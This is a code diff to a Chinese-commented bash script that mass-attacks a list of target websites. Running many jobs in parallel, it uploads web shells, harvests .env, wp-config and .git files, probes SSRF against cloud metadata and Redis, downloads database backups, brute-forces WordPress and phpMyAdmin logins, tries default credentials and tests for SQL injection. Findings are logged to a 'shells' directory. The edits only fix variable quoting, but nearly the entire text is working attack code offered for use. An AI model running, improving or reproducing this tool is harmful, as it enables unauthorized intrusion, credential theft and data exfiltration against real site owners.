@@ -33,7 +33,7 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 # ==========================================
 echo ""
 echo "[1/8] 🚀 文件上传（20路径×8扩展名，并发20，五重验证）..."
-CNT=0
+export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     flag="$(echo {} | md5sum | cut -c1-8)"
@@ -66,7 +66,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                         if echo "$v3" | grep -qE "uid=|gid="; then
                             # 验证5: 确保不是错误页面
                             if ! echo "$v3" | grep -qiE "error|404|not found|forbidden"; then
-                                echo "$shell" >> '"$OUT"'/shells/01_upload.txt
+                                echo "$shell" >> "$OUT/shells/01_upload.txt"
                                 rm -f /tmp/u_$$_${ext}
                                 exit 0
                             fi
@@ -84,6 +84,7 @@ echo "  ✅ Upload Shell: $UPLOAD"
 # ==========================================
 # 2. 敏感文件（内容验证）
 # ==========================================
+export OUT
 echo "[2/8] 📁 敏感文件（内容验证，并发20）..."
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -95,7 +96,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
         if echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
             # 验证：包含常见环境变量名
             if echo "$env_resp" | grep -qiE "DB_|APP_|API_|SECRET|KEY|PASSWORD"; then
-                echo "$url/.env" >> '"$OUT"'/shells/02_env.txt
+                echo "$url/.env" >> "$OUT"/shells/02_env.txt
             fi
         fi
     fi
@@ -106,7 +107,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
         # 验证：包含PHP标签和配置
         if echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
            ! echo "$php_resp" | grep -qiE "<html|<body|404|not found|forbidden"; then
-            echo "$url/config.php" >> '"$OUT"'/shells/02_config.txt
+            echo "$url/config.php" >> "$OUT"/shells/02_config.txt
         fi
     fi
     
@@ -115,7 +116,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     if [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
         if echo "$wp_resp" | grep -qE "<?php" && echo "$wp_resp" | grep -qiE "DB_NAME|DB_USER|DB_PASSWORD" && \
            ! echo "$wp_resp" | grep -qiE "<html|<body|404"; then
-            echo "$url/wp-config.php" >> '"$OUT"'/shells/02_wpconfig.txt
+            echo "$url/wp-config.php" >> "$OUT"/shells/02_wpconfig.txt
         fi
     fi
     
@@ -124,7 +125,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     if [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
         if echo "$git_resp" | grep -qE "\[.*\]" && echo "$git_resp" | grep -qiE "remote|url|branch" && \
            ! echo "$git_resp" | grep -qiE "<html|<body|404"; then
-            echo "$url/.git/config" >> '"$OUT"'/shells/02_git.txt
+            echo "$url/.git/config" >> "$OUT"/shells/02_git.txt
         fi
     fi
 '
@@ -138,6 +139,7 @@ echo "  ✅ 敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG g
 # ==========================================
 # 3. 未授权API（数据验证）
 # ==========================================
+export OUT
 echo "[3/8] 🌐 未授权API（数据验证，并发20）..."
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -153,7 +155,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                 if ! echo "$resp" | jq . | grep -qiE "error|unauthorized|forbidden|access denied"; then
                     # 验证4: 数据量足够（>200字符）
                     if [ $(echo "$resp" | wc -c) -gt 200 ]; then
-                        echo "$url$api" >> '"$OUT"'/shells/03_api.txt
+                        echo "$url$api" >> "$OUT"/shells/03_api.txt
                         break
                     fi
                 fi
@@ -167,6 +169,7 @@ echo "  ✅ 未授权API: $API"
 # ==========================================
 # 4. Git泄露（多重验证）
 # ==========================================
+export OUT
 echo "[4/8] 🔓 Git泄露（多重验证，并发30）..."
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
@@ -179,7 +182,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
         if echo "$config_resp" | grep -qE "\[.*\]" && echo "$config_resp" | grep -qiE "remote|url"; then
             # 验证3: 不是错误页面
             if ! echo "$head_resp" | grep -qiE "<html|<body|404|not found"; then
-                echo "$url" >> '"$OUT"'/shells/04_git.txt
+                echo "$url" >> "$OUT"/shells/04_git.txt
             fi
         fi
     fi
@@ -190,6 +193,7 @@ echo "  ✅ Git泄露: $GIT_LEAK"
 # ==========================================
 # 5. WordPress（多重检测）
 # ==========================================
+export OUT
 echo "[5/8] 🎯 WordPress（多重检测，并发30）..."
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
@@ -201,7 +205,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
         if echo "$resp" | grep -qiE "wp-includes|wp-admin|wordpress|wp-json"; then
             # 验证3: 不是误报（排除CDN引用）
             if echo "$resp" | grep -qiE "wp-content/themes|wp-content/plugins|wp-content/uploads"; then
-                echo "$url" >> '"$OUT"'/shells/05_wordpress.txt
+                echo "$url" >> "$OUT"/shells/05_wordpress.txt
             fi
         fi
     fi
@@ -212,6 +216,7 @@ echo "  ✅ WordPress: $WP"
 # ==========================================
 # 6. phpMyAdmin（登录页面验证）
 # ==========================================
+export OUT
 echo "[6/8] 🔓 phpMyAdmin（登录页面验证，并发30）..."
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
@@ -223,7 +228,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
         if echo "$resp" | grep -qiE "phpmyadmin|pma_|server.*password" && \
            echo "$resp" | grep -qiE "<form|<input.*type.*password" && \
            ! echo "$resp" | grep -qiE "404|not found|forbidden"; then
-            echo "$url$path" >> '"$OUT"'/shells/06_phpmyadmin.txt
+            echo "$url$path" >> "$OUT"/shells/06_phpmyadmin.txt
             break
         fi
     done
@@ -234,6 +239,7 @@ echo "  ✅ phpMyAdmin: $PMA"
 # ==========================================
 # 7. SSRF端点（元数据验证）
 # ==========================================
+export OUT
 echo "[7/8] 🔗 SSRF端点（元数据验证，并发15）..."
 cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
     url="{}"
@@ -243,7 +249,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
         resp=$(curl -skL -m 6 "$url$path?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
         if echo "$resp" | grep -qiE "instance-id|ami-id|local-ipv4" && \
            ! echo "$resp" | grep -qiE "error|forbidden|403"; then
-            echo "$url$path" >> '"$OUT"'/shells/07_ssrf.txt
+            echo "$url$path" >> "$OUT"/shells/07_ssrf.txt
             break
         fi
         
@@ -251,7 +257,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
         resp2=$(curl -skL -m 6 "$url$path?url=http://127.0.0.1:6379" 2>/dev/null)
         if echo "$resp2" | grep -qiE "PONG|redis|REDIS" && \
            ! echo "$resp2" | grep -qiE "error|forbidden"; then
-            echo "$url$path" >> '"$OUT"'/shells/07_ssrf.txt
+            echo "$url$path" >> "$OUT"/shells/07_ssrf.txt
             break
         fi
     done
@@ -262,6 +268,7 @@ echo "  ✅ SSRF: $SSRF"
 # ==========================================
 # 8. 备份文件（内容验证）
 # ==========================================
+export OUT
 echo "[8/8] 💾 备份文件（内容验证，并发20）..."
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -277,12 +284,12 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                 if [ $(echo "$content" | wc -c) -gt 100 ]; then
                     # SQL文件验证
                     if [ "${ext}" = "sql" ] && echo "$content" | grep -qiE "CREATE TABLE|INSERT INTO|DROP TABLE"; then
-                        echo "$url/${name}.${ext}" >> '"$OUT"'/shells/08_backup.txt
+                        echo "$url/${name}.${ext}" >> "$OUT"/shells/08_backup.txt
                         break 2
                     fi
                     # 压缩文件验证（检查文件头）
                     if [ "${ext}" = "zip" ] && echo "$content" | head -c 4 | grep -q "PK"; then
-                        echo "$url/${name}.${ext}" >> '"$OUT"'/shells/08_backup.txt
+                        echo "$url/${name}.${ext}" >> "$OUT"/shells/08_backup.txt
                         break 2
                     fi
                 fi
@@ -337,6 +344,7 @@ echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
 # ==========================================
 # 10. WordPress弱口令爆破（增强字典）
 # ==========================================
+export OUT
 echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
 [ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
     url="{}"
@@ -355,7 +363,7 @@ echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "incorrect|error|invalid|login" && \
            echo "$resp" | grep -qiE "dashboard|admin|wp-admin"; then
-            echo "$url|$user:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            echo "$url|$user:$pass" >> "$OUT"/shells/10_wp_creds.txt
             exit 0
         fi
     done
@@ -367,7 +375,7 @@ echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
            echo "$resp" | grep -qiE "dashboard|admin"; then
-            echo "$url|admin:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            echo "$url|admin:$pass" >> "$OUT"/shells/10_wp_creds.txt
             exit 0
         fi
     done
@@ -379,7 +387,7 @@ echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
            echo "$resp" | grep -qiE "dashboard|admin"; then
-            echo "$url|admin:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
+            echo "$url|admin:$pass" >> "$OUT"/shells/10_wp_creds.txt
             exit 0
         fi
     done < '"$TOP100"'
@@ -390,6 +398,7 @@ echo "  ✅ WordPress凭证: $WP_CREDS"
 # ==========================================
 # 11. phpMyAdmin弱口令爆破（增强字典）
 # ==========================================
+export OUT
 echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
 [ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
     url="{}"
@@ -408,7 +417,7 @@ echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
            echo "$resp" | grep -qiE "main|database|server|phpmyadmin"; then
-            echo "$url|$user:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            echo "$url|$user:$pass" >> "$OUT"/shells/11_pma_creds.txt
             exit 0
         fi
     done
@@ -418,7 +427,7 @@ echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
         -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
     if ! echo "$resp" | grep -qiE "cannot|error" && \
        echo "$resp" | grep -qiE "main|database"; then
-        echo "$url|root:" >> '"$OUT"'/shells/11_pma_creds.txt
+        echo "$url|root:" >> "$OUT"/shells/11_pma_creds.txt
         exit 0
     fi
     
@@ -429,7 +438,7 @@ echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
            echo "$resp" | grep -qiE "main|database"; then
-            echo "$url|root:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            echo "$url|root:$pass" >> "$OUT"/shells/11_pma_creds.txt
             exit 0
         fi
     done
@@ -441,7 +450,7 @@ echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
         
         if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
            echo "$resp" | grep -qiE "main|database"; then
-            echo "$url|root:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
+            echo "$url|root:$pass" >> "$OUT"/shells/11_pma_creds.txt
             exit 0
         fi
     done < '"$TOP100"'
@@ -452,6 +461,7 @@ echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
 # ==========================================
 # 12. 默认凭证快速检测（API/管理后台）
 # ==========================================
+export OUT
 echo "[12/14] 🔑 默认凭证检测（API/后台，并发20）..."
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -468,7 +478,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             
             if echo "$resp" | grep -qiE "token|success|true|200" && \
                ! echo "$resp" | grep -qiE "error|invalid|incorrect|unauthorized"; then
-                echo "$url$api_path|$user:$pass" >> '"$OUT"'/shells/12_default_creds.txt
+                echo "$url$api_path|$user:$pass" >> "$OUT"/shells/12_default_creds.txt
                 break 2
             fi
         done
@@ -480,6 +490,7 @@ echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"
 # ==========================================
 # 13. SQL注入检测（布尔盲注+时间盲注+报错注入+联合查询）
 # ==========================================
+export OUT
 echo "[13/14] 💉 SQL注入检测（布尔+时间+报错+联合，并发15）..."
 cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
     url="{}"
@@ -501,7 +512,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             # 报错注入检测（最快，先检测）
             error_resp=$(curl -skL -m 4 "${base_url}?${param}=1'"'"'" 2>/dev/null)
             if echo "$error_resp" | grep -qiE "mysql|postgresql|sqlite|mssql|oracle|syntax error|sql error|database error|warning.*mysql|you have an error"; then
-                echo "${base_url}?${param}=1'"'"'" >> '"$OUT"'/shells/13_sqli_error.txt
+                echo "${base_url}?${param}=1'"'"'" >> "$OUT"/shells/13_sqli_error.txt
                 break
             fi
             
@@ -517,7 +528,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
                 end=$(date +%s)
                 
                 if [ $((end - start)) -ge 4 ]; then
-                    echo "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >> '"$OUT"'/shells/13_sqli_time.txt
+                    echo "${base_url}?${param}=1'"'"' AND SLEEP(5)--" >> "$OUT"/shells/13_sqli_time.txt
                     break
                 fi
             fi
@@ -527,14 +538,14 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             if echo "$union_resp" | grep -qE "[^0-9]2[^0-9]" && \
                ! echo "$union_resp" | grep -qiE "error|syntax|mysql error|sql error" && \
                [ $(echo "$union_resp" | wc -c) -gt 100 ]; then
-                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> '"$OUT"'/shells/13_sqli_union.txt
+                echo "${base_url}?${param}=1 UNION SELECT 1,2,3--" >> "$OUT"/shells/13_sqli_union.txt
                 break
             fi
             
             # 双引号注入检测
             dq_error=$(curl -skL -m 4 "${base_url}?${param}=1\"" 2>/dev/null)
             if echo "$dq_error" | grep -qiE "mysql|postgresql|sqlite|syntax error|sql error"; then
-                echo "${base_url}?${param}=1\"" >> '"$OUT"'/shells/13_sqli_error.txt
+                echo "${base_url}?${param}=1\"" >> "$OUT"/shells/13_sqli_error.txt
                 break
             fi
         done
